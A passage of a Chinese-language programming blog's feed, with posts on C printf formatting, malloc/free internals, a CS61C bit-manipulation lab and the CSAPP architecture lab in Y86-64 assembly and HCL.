</code>（空格）：如果第一个字符不是正负号，则在该字符前添加一个空格。</li><li><code>#</code>：对于 <code>%o</code>、<code>%x</code>、<code>%X</code>，添加前缀 <code>0</code>、<code>0x</code>、<code>0X</code>；对于 <code>%f</code>、<code>%e</code>、<code>%E</code>，强制显示小数点；对于 <code>%g</code>、<code>%G</code>，防止尾部零被删除。</li><li><code>0</code>：用零填充空位。</li></ul></li></ul><h3 id="宽度和精度"><a class="markdownIt-Anchor" href="#宽度和精度"></a> 宽度和精度</h3><ul><li><p><code>宽度</code>：指定输出字段的最小宽度。如果输出小于这个宽度，会在左边或右边填充空格或零（取决于是否使用了 <code>-</code> 或 <code>0</code> 标志）。</p></li><li><p><code>精度</code>：</p><ul><li>对于 <code>%f</code>、<code>%e</code>、<code>%E</code>，精度表示小数点后的数字位数。</li><li>对于 <code>%g</code>、<code>%G</code>，精度表示有效数字的最大位数。</li><li>对于 <code>%s</code>，精度表示输出字符串的最大长度。</li><li>对于整数类型，精度表示最小数字位数，不足部分会填充零。</li></ul></li></ul><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">42</span>;</span><br><span class="line">    <span class="type">float</span> f = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">char</span> s[] = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Integer: %d\n&quot;</span>, i);            <span class="comment">// 基本整型输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Integer with width: %10d\n&quot;</span>, i); <span class="comment">// 宽度为10，右对齐</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Integer with width and zero padding: %010d\n&quot;</span>, i); <span class="comment">// 宽度为10，用零填充</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Float: %f\n&quot;</span>, f);              <span class="comment">// 基本浮点数输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Float with precision: %.2f\n&quot;</span>, f); <span class="comment">// 保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;String: %s\n&quot;</span>, s);             <span class="comment">// 字符串输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;String with precision: %.5s\n&quot;</span>, s); <span class="comment">// 只输出字符串的前5个字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h3><ul><li>确保格式指定符与提供的参数类型相匹配，否则可能会导致未定义的行为。</li><li>使用 <code>%s</code> 输出字符串时，确保字符串以 null 结尾，否则可能会读取到不确定的数据。</li><li>使用 <code>%</code> 打印百分号时，需要写成 <code>%%</code>。</li><li>注意 <code>printf</code> 家族函数的安全性问题，如缓冲区溢出。建议使用 <code>snprintf</code> 或 <code>fgets/fputs</code> 来避免这类问题。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在日常使用中C语言时，对于命令行工具输出格式化控制非常重要，虽然每天都在用&lt;code&gt;printf&lt;/code&gt;但是对其具体的使用还是很容易忘记，于是做如下总结&lt;/p&gt;
&lt;p&gt;在 C 语言中，格式化打印主要通过 &lt;code&gt;printf&lt;/code&gt;、&lt;code&gt;sprin</summary>
      
    
    
    
    <category term="others" scheme="https://lcjd99.github.io/categories/others/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>重新学习C语言内存管理</title>
    <link href="https://lcjd99.github.io/others/c-and-memory/"/>
    <id>https://lcjd99.github.io/others/c-and-memory/</id>
    <published>2024-04-03T14:50:47.000Z</published>
    <updated>2024-04-10T09:12:38.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>在学习完操作系统<strong>MIT6.828</strong>后重新学习C语言的内存管理问题。</p><h2 id="关于标准库-malloc-和-free"><a class="markdownIt-Anchor" href="#关于标准库-malloc-和-free"></a> 关于标准库 malloc 和 free</h2><p>在C标准库中对内存的管理是通过为每个空闲内存提供一个小的数据结构来管理的，大致的伪代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> size;  <span class="comment">//内存块的大小</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">block</span>* <span class="title">next</span>;</span> <span class="comment">//下一个内存块的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说这是一个记录空闲空间的循环链表(自己实现的<em>JOS</em>实际上也是这样管理内存)。</p><h3 id="malloc-的过程"><a class="markdownIt-Anchor" href="#malloc-的过程"></a> malloc 的过程</h3><p><code>malloc</code> 会根据申请内存的大小，在其中找到一个足够大的块，将这个块移出链表，并将指针返回。如果没有足够大的块，就会像操作系统申请空间，如果仍然无法满足会返回分配失败</p><p>在malloc的过程中还存在多个块满足条件如何选择的问题，此时会涉及到三种策略：</p><ol><li>best-fit ： 分配大小最合适的块</li><li>firtst-fit ：  分配最先找到的满足条件的块</li><li>next-fit ： 在每次遍历过程中记录位置，分配记录位置后下一个满足的块</li></ol><h3 id="free-的过程"><a class="markdownIt-Anchor" href="#free-的过程"></a> free 的过程</h3><p><code>free</code> 会将参数中指定的内存块加入到空闲块链表中，同时检查临近(物理空间)的块是否空闲，如果空闲会合并为一个更大的块。</p><h3 id="使用时注意"><a class="markdownIt-Anchor" href="#使用时注意"></a> 使用时注意</h3><ul><li><code>malloc</code> 二维数组的时候首先分配一维的指针，在循环分配空间，不能分配连续的空间</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;在学习完操作系统&lt;strong&gt;MIT6.828&lt;/strong&gt;后重新学习C语言的内存管理问题。&lt;/p&gt;
&lt;h2 id=&quot;关于标准库-mall</summary>
      
    
    
    
    <category term="others" scheme="https://lcjd99.github.io/categories/others/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【CS61C】Lab2 实验解析</title>
    <link href="https://lcjd99.github.io/Course/cs61c/Lab2/"/>
    <id>https://lcjd99.github.io/Course/cs61c/Lab2/</id>
    <published>2024-03-04T14:51:47.000Z</published>
    <updated>2024-04-27T15:04:14.566Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>本人学习的是 <em>2020 fall</em>版的<a href="https://inst.eecs.berkeley.edu/~cs61c/fa20/">CS61C</a>，本文将对Lab2解题思路做大致介绍，具体代码可以参考<a href="https://github.com/LCJD99/cs61c">我的仓库</a></p><h3 id="解题思路"><a class="markdownIt-Anchor" href="#解题思路"></a> 解题思路</h3><h4 id="exercise-1-bit-operations"><a class="markdownIt-Anchor" href="#exercise-1-bit-operations"></a> Exercise 1: Bit Operations</h4><p>三道位运算的题目中值得一说的是第二道，函数接口如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the nth bit of the value of x to v.</span></span><br><span class="line"><span class="comment">// Assume 0 &lt;= n &lt;= 31, and v is 0 or 1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">(<span class="type">unsigned</span> * x, <span class="type">unsigned</span> n, <span class="type">unsigned</span> v)</span>;</span><br></pre></td></tr></table></figure><p>题目限制如下</p><blockquote><p>You may ONLY use bitwise operations such as and (&amp;), or (|), xor (^), not (~), left shifts («), and right shifts (»). You may not use any for/while loops or conditional statements. You also may not use modulo (%), division, addition subtraction, or multiplication for this question.</p></blockquote><p>我的解题思路是:</p><ol><li>首先分析只有当需要变化的位<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>不同时才会发生改变。</li><li>需要通过位运算找到<strong>位反转</strong>的方式和<strong>判断不同</strong>的方式</li><li>位反转：通过<strong>异或</strong>实现</li><li>判断不同： 通过移位到最低位比较得到</li></ol><p>具体代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">(<span class="type">unsigned</span> * x, <span class="type">unsigned</span> n, <span class="type">unsigned</span> v)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> bit = ((*x) &gt;&gt; n) &amp; <span class="number">1</span>;</span><br><span class="line">    (*x) ^= ((bit ^ v) &lt;&lt; n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h3&gt;
&lt;p&gt;本人学习的是 &lt;em&gt;2020 fall&lt;/em&gt;版的&lt;a href=&quot;https://inst.eecs.berkeley.edu/~cs61</summary>
      
    
    
    
    <category term="CS61C" scheme="https://lcjd99.github.io/categories/CS61C/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP深入理解计算机系统 Lab4(architecture Lab) 详解</title>
    <link href="https://lcjd99.github.io/Course/csapp/Lab4/"/>
    <id>https://lcjd99.github.io/Course/csapp/Lab4/</id>
    <published>2023-10-25T14:51:47.000Z</published>
    <updated>2024-04-12T15:35:52.341Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。</p></blockquote><h2 id="实验说明"><a class="markdownIt-Anchor" href="#实验说明"></a> 实验说明</h2><p>在官方网站上其实有两个版本的architecture Lab，这里我们使用的是<code>CSAPP 3e</code>的实验。</p><p>本实验通过自己动手写汇编代码，自己设计CPU的执行过程，优化执行过程从而对计算机中CPU执行过程和流水线等知识有更深刻的理解，我认为是目前几个实验中最灵活的一个。</p><p>具体实验环境的搭建在<a href="http://csapp.cs.cmu.edu/3e/archlab.pdf">实验手册</a>中都有讲解，同时还有一个关于<code>Y86</code>模拟器的使用说明，都在下载的项目目录下有。</p><p><strong>特别说明：本实验要求使用Y86的汇编语言，需要参考CSAPP第4章的相关内容学习后再动手编写。</strong></p><h2 id="实验具体流程"><a class="markdownIt-Anchor" href="#实验具体流程"></a> 实验具体流程</h2><h3 id="part-a"><a class="markdownIt-Anchor" href="#part-a"></a> Part A</h3><p>根据实验说明，我们需要实现在<code>example.c</code>中三个函数的<code>Y86-64</code>版本的汇编代码，在编写汇编代码前，需要简要梳理一下<code>Y86-64</code>的语法规则，这里建议详细阅读原书的4.1章节，我只对关键部分进行说明：</p><ol><li>通用寄存器有15个(没有<code>%15</code>)</li><li>指令集设计如下图</li></ol><p>![指令集](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109164413862.png)</p><p>在原书的4.1.5节对一个完整的汇编代码有详细的介绍，这里就不过多说明。在本实验中有一部分代码包括栈的设置、测试数据初始化的部分是共用的代码，我将其写在这里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  .pos 0</span><br><span class="line">  irmovq stack, %rsp</span><br><span class="line">  call main</span><br><span class="line">  halt</span><br><span class="line"></span><br><span class="line">  .align 8</span><br><span class="line">ele1:</span><br><span class="line">  .quad 0x00a</span><br><span class="line">  .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">  .quad 0x0b0</span><br><span class="line">  .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">  .quad 0xc00</span><br><span class="line">  .quad 0 </span><br><span class="line">main:</span><br><span class="line">  irmovq ele1, %rdi</span><br><span class="line">  # call the function</span><br><span class="line">  call func</span><br><span class="line">  ret</span><br><span class="line">  </span><br><span class="line"># the positon insert function</span><br><span class="line"></span><br><span class="line">  .pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><h4 id="sumys"><a class="markdownIt-Anchor" href="#sumys"></a> sum.ys</h4><p>这里需要写一个链表元素值求和的汇编代码，并给出测试数据。具体编写思路只需要按照c代码对应翻译即可</p><p>函数部分代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sum_list:</span><br><span class="line">  irmovq $8, %r8</span><br><span class="line">  irmovq $0, %rax</span><br><span class="line">  andq %rdi, %rdi</span><br><span class="line">  jmp test</span><br><span class="line">loop:</span><br><span class="line">  mrmovq (%rdi), %r10</span><br><span class="line">  addq %r10, %rax</span><br><span class="line">  addq %r8, %rdi</span><br><span class="line">  mrmovq (%rdi), %rdi</span><br><span class="line">  andq %rdi, %rdi</span><br><span class="line">test:</span><br><span class="line">  jne loop</span><br><span class="line">  ret</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中需要说明的是由于<code>y86_64</code>中没有立即数的加法运算，需要我们将需要运算的数存放在寄存器中再进行寄存器的加法运算。</p><p>将这部分代码加入公共代码的部分后结果保存在<code>sum.ys</code>中。调用<code>make sum.yo</code>通过汇编器将代码编译为可执行程序<code>sum.yo</code>，然后调用<code>./yis sum.yo</code></p><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./yis sum.yo</span><br><span class="line">Stopped <span class="keyword">in</span> 30 steps at PC = 0x13.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=1 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000200</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000008</span><br><span class="line">%r10:   0x0000000000000000      0x0000000000000c00</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure><p>通过<code>rax</code>的验证我们知道，程序正确执行。</p><h4 id="rsumys"><a class="markdownIt-Anchor" href="#rsumys"></a> rsum.ys</h4><p>递归无法像迭代一样完全翻译程序，因为递归程序在汇编代码中需要维护递归栈，但是我们不需要将所有当前变量都保存在栈中，根据需求我们只需要把当前结点的值保存在栈中,因此只需要为每次递归分配<code>8B</code>的空间即可，并和递归调用的返回值相加即可。</p><p>函数部分代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sum_list:</span><br><span class="line">  irmovq $8, %r8</span><br><span class="line">  irmovq $0, %rax</span><br><span class="line">  andq %rdi, %rdi</span><br><span class="line">  jmp test</span><br><span class="line">loop:</span><br><span class="line">  mrmovq (%rdi), %r10</span><br><span class="line">  addq %r10, %rax</span><br><span class="line">  addq %r8, %rdi</span><br><span class="line">  mrmovq (%rdi), %rdi</span><br><span class="line">  andq %rdi, %rdi</span><br><span class="line">test:</span><br><span class="line">  jne loop</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>执行同样的测试结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ./yis rsum.yo</span><br><span class="line">Stopped <span class="keyword">in</span> 48 steps at PC = 0x13.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=0 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000200</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000008</span><br><span class="line">%r10:   0x0000000000000000      0x0000000000000c00</span><br><span class="line">%r11:   0x0000000000000000      0x000000000000000a</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01c0: 0x0000000000000000      0x000000000000009c</span><br><span class="line">0x01c8: 0x0000000000000000      0x0000000000000c00</span><br><span class="line">0x01d0: 0x0000000000000000      0x000000000000009c</span><br><span class="line">0x01d8: 0x0000000000000000      0x00000000000000b0</span><br><span class="line">0x01e0: 0x0000000000000000      0x000000000000009c</span><br><span class="line">0x01e8: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>验证<code>rax</code>的结果说明程序正确执行。</p><h4 id="copyys"><a class="markdownIt-Anchor" href="#copyys"></a> copy.ys</h4><p>这里只需要将三个参数传入即可，执行过程逻辑并不困难。具体代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">  irmovq src, %rdi</span><br><span class="line">  irmovq dest, %rsi</span><br><span class="line">  irmovq $3, %rdx</span><br><span class="line">  call copy_block</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">  xorq %rax, %rax</span><br><span class="line">  irmovq $8, %r8</span><br><span class="line">  irmovq $1, %r11</span><br><span class="line">L2:</span><br><span class="line">  andq %rdx, %rdx</span><br><span class="line">  je L3</span><br><span class="line">  mrmovq (%rdi), %r9</span><br><span class="line">  rmmovq %r9, (%rsi)</span><br><span class="line">  subq %r11, %rdx</span><br><span class="line">  xorq %r9, %rax</span><br><span class="line">  addq %r8, %rdi</span><br><span class="line">  addq %r8, %rsi</span><br><span class="line">  jmp L2</span><br><span class="line">L3:</span><br><span class="line">  halt</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>测试如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ./yis copy.yo</span><br><span class="line">Stopped <span class="keyword">in</span> 39 steps at PC = 0xb6.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=1 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rsp:   0x0000000000000000      0x00000000000001f0</span><br><span class="line">%rsi:   0x0000000000000000      0x0000000000000048</span><br><span class="line">%rdi:   0x0000000000000000      0x0000000000000030</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000008</span><br><span class="line">%r9:    0x0000000000000000      0x0000000000000c00</span><br><span class="line">%r11:   0x0000000000000000      0x0000000000000001</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x0030: 0x0000000000000111      0x000000000000000a</span><br><span class="line">0x0038: 0x0000000000000222      0x00000000000000b0</span><br><span class="line">0x0040: 0x0000000000000333      0x0000000000000c00</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000006f</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到内存中的变化过程和返回值<code>rax</code>的校验码验证实验结果正确。</p><h3 id="partb"><a class="markdownIt-Anchor" href="#partb"></a> PartB</h3><p>这部分的实验是要为SEQ处理器添加一条指令<code>iaddq</code>，这里需要修改hcl文件中的控制逻辑，使其满足需求的功能。这个部分比较容易，因为框架都已经写好，我们只需要将<code>iaddq</code>添加到相应的部分即可。</p><p>首先我们需要思考一下<code>iaddq</code>需要实现的动作，根据下图我们看到该指令的构成，对我们解析指令非常重要。</p><p>![iddq](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109191110782.png)</p><p>我们可以以<code>OPq</code>和<code>irmovq</code>的指令作为案例可以设计出<code>iaddq</code>在各个步骤的执行如下(其中M_x,x表示取xByte)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Fetch：</span><br><span class="line">icode:ifun &lt;- M_1[PC]</span><br><span class="line">rA:rB &lt;- M_1[PC+1]</span><br><span class="line">ValC &lt;- M_8[PC+2]</span><br><span class="line">ValP &lt;- PC + 10</span><br><span class="line">Decode:</span><br><span class="line">valB &lt;- R[rB]</span><br><span class="line">Execute:</span><br><span class="line">ValE &lt;- ValC + ValB</span><br><span class="line">Set CC</span><br><span class="line">Memory：</span><br><span class="line"></span><br><span class="line">Write back:</span><br><span class="line">R[rB] &lt;- valE</span><br><span class="line">PC update:</span><br><span class="line">PC &lt;- valP</span><br></pre></td></tr></table></figure><p>根据以上可以修改<code>seq-full.hcl</code></p><p>1、在<code>Symbolic representation of Y86-64 Instruction Codes</code>的部分添加如下代码，用于表示这个指令的符号表示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wordsig IIADDQ<span class="string">&#x27;I_IADDQ&#x27;</span></span><br></pre></td></tr></table></figure><p>2、然后以此添加<code>IIADDQ</code>到 <code>instr_valid</code> ， <code>need_regids</code> ， <code>need_valC</code>， <code>srcA:rA</code> ， <code>srcB:rB</code>， <code>dstE:rB(second)</code>， <code>aluA:valC</code>，<code>aluB:valB</code>， <code>setcc</code></p><p>添加完后执行如下: <code>./ssim -t ../y86-code/asumi.yo</code> (记得先在<code>../y86-code</code>目录下<code>make</code>一下)，简单测试后，执行<code>cd ../y86-code; make testssim</code>。结果如下：</p><p>![image-20231109195158473](/Users/lcjd/Library/Application Support/typora-user-images/image-20231109195158473.png)</p><h3 id="part3"><a class="markdownIt-Anchor" href="#part3"></a> Part3</h3><p>在这个部分我们需要优化<code>ncopy</code>函数在流水线中的执行效率，我们可以通过修改添加新的指令在系统中，也可以通过修改指令的执行顺序等方式，提供了很大的自由度，这需要我们充分了解计算机系统的指令级优化策略。这个部分也是这次实验的重点。</p><p>在没有任何优化时执行<code>./benchmark.pl</code>后的平均时间为<code>15.18</code>，接下来我们就要开始优化这个流水线</p><h4 id="1-添加iaddr"><a class="markdownIt-Anchor" href="#1-添加iaddr"></a> 1. 添加iaddr</h4><p>首先可以把<code>Part2</code>中的<code>iaddr</code>，这样可以减少指令数，提升执行效率，修改<code>pipe-full.hcl</code>的过程大同小异，这里就不赘述了，以下是对<code>ncopy.ys</code>的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xorq %rax,%rax# count = 0;</span><br><span class="line">andq %rdx,%rdx# len &lt;= 0?</span><br><span class="line">jle Done# if so, goto Done:</span><br><span class="line"> </span><br><span class="line">Loop:</span><br><span class="line">  mrmovq (%rdi), %r10# read val from src...</span><br><span class="line">rmmovq %r10, (%rsi)# ...and store it to dst</span><br><span class="line">andq %r10, %r10# val &lt;= 0?</span><br><span class="line">jle Npos# if so, goto Npos:</span><br><span class="line">iaddq $1, %rax# count++</span><br><span class="line">Npos:</span><br><span class="line">iaddq $-1, %rdx# len--</span><br><span class="line">iaddq $8, %rdi# src++</span><br><span class="line">iaddq $8, %rsi# dst++</span><br><span class="line">andq %rdx,%rdx# len &gt; 0?</span><br><span class="line">jg Loop# if so, goto Loop:</span><br></pre></td></tr></table></figure><p>经过修改并验证正确性后测试结果为<code>Average CPE  12.70</code></p><h4 id="2-根据分支修改代码"><a class="markdownIt-Anchor" href="#2-根据分支修改代码"></a> 2. 根据分支修改代码</h4><p>已知如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Predict next value of PC</span><br><span class="line">word f_predPC = [</span><br><span class="line">f_icode in &#123; IJXX, ICALL &#125; : f_valC;</span><br><span class="line">1 : f_valP;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>我们知道预测的方向是条件分支，而我们的代码中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。&lt;/p&gt;
&lt;/blockquote&gt;
